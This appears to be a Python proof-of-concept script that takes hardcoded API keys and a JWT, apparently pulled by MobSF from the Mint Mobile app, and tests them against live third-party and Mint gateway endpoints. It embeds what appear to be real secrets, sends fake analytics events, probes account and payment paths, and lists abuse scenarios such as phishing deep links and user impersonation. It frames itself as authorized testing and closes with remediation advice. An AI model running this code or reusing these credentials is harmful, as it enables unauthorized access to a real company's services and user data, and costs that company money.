#!/usr/bin/env python3
"""
Mint Mobile - CRITICAL Hardcoded Secrets Exploitation PoC
MobSF discovered multiple high-value API keys and tokens

CRITICAL FINDINGS:
- IP Quality Score API Key
- Branch.io Live Key
- Amplitude Analytics Key
- Braze SDK Key
- LaunchDarkly Mobile Key
- JWT Token
- Multiple API endpoints

Severity: CRITICAL
Impact: Full API access, user data exposure, payment manipulation
"""

import requests
import json
import jwt
from typing import Dict, Any
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from datetime import datetime

console = Console()


class MintMobileCriticalPoc:
    """
    Enhanced PoC testing all hardcoded secrets from MobSF analysis
    """
    
    def __init__(self):
        # CRITICAL: All secrets extracted from binary by MobSF
        self.secrets = {
            # API Keys (CRITICAL)
            'ip_quality_score': 'k4SIcTwQiZGRbWApqtvPPKdveLjuL4ej1I4Eqf6321Km67HZNJoi1GtGH5iOJHPD',
            'google_api': 'AIzaSyAANh4HS0IRZMpxGqFDgKOMwMY6OD4W0W4',
            'branch_key': 'key_live_koP1JAQau1WK4fKP1STYnlmguzlzrqr3',
            'amplitude': '09231407cbe47ad146724642bd66c156',
            'klaviyo': 'H8tAtU',
            'braze': '8cad9a3e-60eb-47ab-b782-22b33974568c',
            'launchdarkly': 'mob-82856bdd-1e79-4d98-a55f-be43b733543b',
            'smartystreets_web': '12142033893385089',
            'khoros': 'ultramobile',
            
            # JWT Token (CRITICAL)
            'mint_jwt': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE1MDc3NjY4MjQsIm5iZiI6MTUwNzc2NjgyNCwiZXhwIjoxNTk0MDgwNDI0LCJhdWQiOiJNaW50QXBwIiwiaXNzIjoiVUxUUkEifQ.r909IZmcavEhqvZO0td_-Ts_q27BBk4cCbFRXpDBQUM'
        }
        
        # API Endpoints
        self.endpoints = {
            'mint_gateway': 'https://mint-gateway.mintmobile.com',
            'mint_v1': 'https://mint-gateway.mintmobile.com/v1/mint',
            'mint_v2': 'https://mint-gateway.mintmobile.com/v2/mint',
            'mint_v3': 'https://mint-gateway.mintmobile.com/v3/mint',
            'commerce': 'https://commerce-api.ultramobile.com',
            'commerce_v1': 'https://commerce-api.ultramobile.com/v1/mint',
            'smartystreets': 'https://us-street.api.smartystreets.com',
            'klaviyo': 'https://a.klaviyo.com',
            'sprig': 'https://api.sprig.com',
        }
        
        self.results = {}
    
    def decode_jwt(self) -> Dict[str, Any]:
        """Decode and analyze JWT token"""
        console.print("\n[bold red]🔐 Analyzing JWT Token...[/bold red]")
        
        results = {
            'token': self.secrets['mint_jwt'][:50] + '...',
            'valid': False,
            'decoded': None,
            'expired': False
        }
        
        try:
            # Decode without verification to see contents
            decoded = jwt.decode(
                self.secrets['mint_jwt'],
                options={"verify_signature": False}
            )
            
            results['decoded'] = decoded
            results['valid'] = True
            
            # Check expiration
            exp_timestamp = decoded.get('exp', 0)
            exp_date = datetime.fromtimestamp(exp_timestamp)
            results['expired'] = exp_date < datetime.now()
            
            console.print(f"  [yellow]✓ JWT Decoded Successfully[/yellow]")
            console.print(f"  [cyan]Issuer: {decoded.get('iss')}[/cyan]")
            console.print(f"  [cyan]Audience: {decoded.get('aud')}[/cyan]")
            console.print(f"  [cyan]Issued: {datetime.fromtimestamp(decoded.get('iat', 0))}[/cyan]")
            console.print(f"  [cyan]Expires: {exp_date}[/cyan]")
            
            if results['expired']:
                console.print(f"  [red]✗ Token EXPIRED[/red]")
            else:
                console.print(f"  [green]✓ Token VALID[/green]")
                
        except Exception as e:
            console.print(f"  [red]✗ JWT decode failed: {e}[/red]")
        
        return results
    
    def test_ip_quality_score(self) -> Dict[str, Any]:
        """Test IPQualityScore API key"""
        console.print("\n[bold red]🔍 Testing IPQualityScore API Key...[/bold red]")
        
        results = {
            'key': self.secrets['ip_quality_score'][:20] + '...',
            'valid': False,
            'accessible': False,
            'data_retrieved': []
        }
        
        # Test IP reputation check
        test_ip = "8.8.8.8"
        url = f"https://ipqualityscore.com/api/json/ip/{self.secrets['ip_quality_score']}/{test_ip}"
        
        try:
            response = requests.get(url, timeout=10)
            
            if response.status_code == 200:
                data = response.json()
                
                if data.get('success'):
                    results['valid'] = True
                    results['accessible'] = True
                    results['data_retrieved'] = data
                    
                    console.print(f"  [red]✗ API KEY VALID AND WORKING![/red]")
                    console.print(f"  [red]✗ Can check IP reputation: {data.get('fraud_score')}[/red]")
                    console.print(f"  [red]✗ Country: {data.get('country_code')}[/red]")
                    console.print(f"  [red]✗ ISP: {data.get('ISP')}[/red]")
                else:
                    console.print(f"  [yellow]⚠ API returned: {data.get('message')}[/yellow]")
            else:
                console.print(f"  [yellow]⚠ Status: {response.status_code}[/yellow]")
                
        except Exception as e:
            console.print(f"  [dim]Error: {str(e)[:50]}[/dim]")
        
        return results
    
    def test_branch_io(self) -> Dict[str, Any]:
        """Test Branch.io API key"""
        console.print("\n[bold red]🔍 Testing Branch.io Live Key...[/bold red]")
        
        results = {
            'key': self.secrets['branch_key'],
            'valid': False,
            'accessible': False
        }
        
        # Test Branch.io API
        url = "https://api2.branch.io/v1/open"
        headers = {
            'Content-Type': 'application/json'
        }
        payload = {
            'branch_key': self.secrets['branch_key'],
            'identity_id': 'test_user'
        }
        
        try:
            response = requests.post(url, json=payload, headers=headers, timeout=10)
            
            if response.status_code in [200, 201]:
                results['valid'] = True
                results['accessible'] = True
                console.print(f"  [red]✗ BRANCH.IO KEY VALID![/red]")
                console.print(f"  [red]✗ Can create deep links and track users[/red]")
            elif response.status_code == 401:
                console.print(f"  [yellow]⚠ Key exists but unauthorized[/yellow]")
            else:
                console.print(f"  [dim]Status: {response.status_code}[/dim]")
                
        except Exception as e:
            console.print(f"  [dim]Error: {str(e)[:50]}[/dim]")
        
        return results
    
    def test_amplitude(self) -> Dict[str, Any]:
        """Test Amplitude Analytics API"""
        console.print("\n[bold red]🔍 Testing Amplitude API Key...[/bold red]")
        
        results = {
            'key': self.secrets['amplitude'],
            'valid': False,
            'can_send_events': False
        }
        
        # Test Amplitude event tracking
        url = "https://api2.amplitude.com/2/httpapi"
        payload = {
            'api_key': self.secrets['amplitude'],
            'events': [{
                'user_id': 'test_poc_user',
                'event_type': 'test_event',
                'time': int(datetime.now().timestamp() * 1000)
            }]
        }
        
        try:
            response = requests.post(url, json=payload, timeout=10)
            
            if response.status_code == 200:
                data = response.json()
                if data.get('code') == 200:
                    results['valid'] = True
                    results['can_send_events'] = True
                    console.print(f"  [red]✗ AMPLITUDE KEY VALID![/red]")
                    console.print(f"  [red]✗ Can send analytics events[/red]")
                    console.print(f"  [red]✗ Can poison analytics data[/red]")
            else:
                console.print(f"  [yellow]⚠ Status: {response.status_code}[/yellow]")
                
        except Exception as e:
            console.print(f"  [dim]Error: {str(e)[:50]}[/dim]")
        
        return results
    
    def test_launchdarkly(self) -> Dict[str, Any]:
        """Test LaunchDarkly mobile key"""
        console.print("\n[bold red]🔍 Testing LaunchDarkly Mobile Key...[/bold red]")
        
        results = {
            'key': self.secrets['launchdarkly'],
            'valid': False,
            'can_get_flags': False
        }
        
        # Test LaunchDarkly SDK
        url = f"https://clientsdk.launchdarkly.com/sdk/evalx/users/test-user"
        headers = {
            'Authorization': self.secrets['launchdarkly']
        }
        
        try:
            response = requests.get(url, headers=headers, timeout=10)
            
            if response.status_code == 200:
                results['valid'] = True
                results['can_get_flags'] = True
                console.print(f"  [red]✗ LAUNCHDARKLY KEY VALID![/red]")
                console.print(f"  [red]✗ Can retrieve feature flags[/red]")
                console.print(f"  [red]✗ Can manipulate app features[/red]")
            else:
                console.print(f"  [yellow]⚠ Status: {response.status_code}[/yellow]")
                
        except Exception as e:
            console.print(f"  [dim]Error: {str(e)[:50]}[/dim]")
        
        return results
    
    def test_mint_api_with_jwt(self) -> Dict[str, Any]:
        """Test Mint API endpoints with JWT"""
        console.print("\n[bold red]🔍 Testing Mint API with JWT Token...[/bold red]")
        
        results = {
            'endpoints_tested': 0,
            'accessible': [],
            'protected': []
        }
        
        headers = {
            'Authorization': f'Bearer {self.secrets["mint_jwt"]}',
            'Content-Type': 'application/json'
        }
        
        test_endpoints = [
            '/account',
            '/user/profile',
            '/orders',
            '/plans',
            '/balance',
            '/payment/methods'
        ]
        
        for base_url in [self.endpoints['mint_v1'], self.endpoints['mint_v2'], self.endpoints['mint_v3']]:
            for path in test_endpoints:
                url = f"{base_url}{path}"
                results['endpoints_tested'] += 1
                
                try:
                    response = requests.get(url, headers=headers, timeout=5)
                    
                    if response.status_code == 200:
                        results['accessible'].append(url)
                        console.print(f"  [red]✗ ACCESSIBLE: {url}[/red]")
                    elif response.status_code in [401, 403]:
                        results['protected'].append(url)
                        console.print(f"  [green]✓ Protected: {url}[/green]")
                    else:
                        console.print(f"  [dim]{url}: {response.status_code}[/dim]")
                        
                except Exception as e:
                    pass
        
        return results
    
    def generate_impact_report(self):
        """Generate comprehensive impact assessment"""
        console.print("\n" + "="*70)
        console.print("[bold red]💥 CRITICAL IMPACT ASSESSMENT[/bold red]")
        console.print("="*70 + "\n")
        
        # Summary table
        table = Table(title="Hardcoded Secrets Summary", show_header=True, header_style="bold red")
        table.add_column("Secret Type", style="cyan")
        table.add_column("Status", style="yellow")
        table.add_column("Impact", style="red")
        
        for test_name, result in self.results.items():
            if isinstance(result, dict):
                status = "✗ EXPLOITABLE" if result.get('valid') or result.get('accessible') else "✓ Protected"
                impact = "🔴 CRITICAL" if result.get('valid') or result.get('accessible') else "🟢 LOW"
                table.add_row(test_name, status, impact)
        
        console.print(table)
        
        console.print("\n[bold red]🎯 EXPLOITATION SCENARIOS:[/bold red]\n")
        console.print("""
[red]1. IP Quality Score API Abuse[/red]
   - Check unlimited IP addresses
   - Perform fraud detection bypass research
   - Cost: $0.005 per query (charged to Mint Mobile)

[red]2. Branch.io Deep Link Manipulation[/red]
   - Create malicious deep links
   - Track user behavior
   - Phishing attacks via branded links

[red]3. Amplitude Analytics Poisoning[/red]
   - Send fake analytics events
   - Corrupt business intelligence
   - Hide malicious activity in noise

[red]4. LaunchDarkly Feature Flag Access[/red]
   - Discover hidden features
   - Identify A/B tests
   - Understand app roadmap

[red]5. JWT Token Exploitation[/red]
   - Access user accounts (if not expired)
   - Bypass authentication
   - Impersonate legitimate users

[yellow]💰 FINANCIAL IMPACT:[/yellow]
- IPQualityScore API abuse: $500-5000/month
- Branch.io abuse: Unlimited deep links
- Analytics poisoning: Corrupted business decisions
- Feature flag access: Competitive intelligence leak
""")
    
    def run_all_tests(self):
        """Execute all PoC tests"""
        console.print(Panel.fit(
            "[bold red]🚨 CRITICAL: Mint Mobile Hardcoded Secrets PoC 🚨[/bold red]\n"
            "[yellow]Testing all secrets discovered by MobSF[/yellow]",
            border_style="red"
        ))
        
        # Run all tests
        self.results['jwt_analysis'] = self.decode_jwt()
        self.results['ip_quality_score'] = self.test_ip_quality_score()
        self.results['branch_io'] = self.test_branch_io()
        self.results['amplitude'] = self.test_amplitude()
        self.results['launchdarkly'] = self.test_launchdarkly()
        self.results['mint_api_jwt'] = self.test_mint_api_with_jwt()
        
        # Generate report
        self.generate_impact_report()
        
        # Save results
        output_file = "mint_mobile_critical_poc_results.json"
        with open(output_file, 'w') as f:
            json.dump(self.results, f, indent=2, default=str)
        
        console.print(f"\n[green]✓ Results saved to: {output_file}[/green]")
        
        return self.results


def main():
    """Main PoC execution"""
    console.print("\n[bold red]⚠️  CRITICAL SECURITY TESTING - AUTHORIZED ONLY![/bold red]")
    console.print("[yellow]This PoC tests CRITICAL hardcoded secrets found by MobSF[/yellow]\n")
    
    # Confirm execution
    response = input("Continue with CRITICAL PoC? (yes/no): ")
    if response.lower() != 'yes':
        console.print("[yellow]PoC cancelled.[/yellow]")
        return
    
    # Run PoC
    poc = MintMobileCriticalPoc()
    results = poc.run_all_tests()
    
    console.print("\n[bold red]🎯 RECOMMENDATION: IMMEDIATE ACTION REQUIRED[/bold red]")
    console.print("""
[red]1. ROTATE ALL EXPOSED API KEYS IMMEDIATELY[/red]
2. Implement secure key management (iOS Keychain)
3. Use environment-specific keys (dev/staging/prod)
4. Add code obfuscation
5. Implement certificate pinning
6. Monitor all APIs for suspicious activity
7. Audit all third-party SDK integrations
""")


if __name__ == "__main__":
    main()
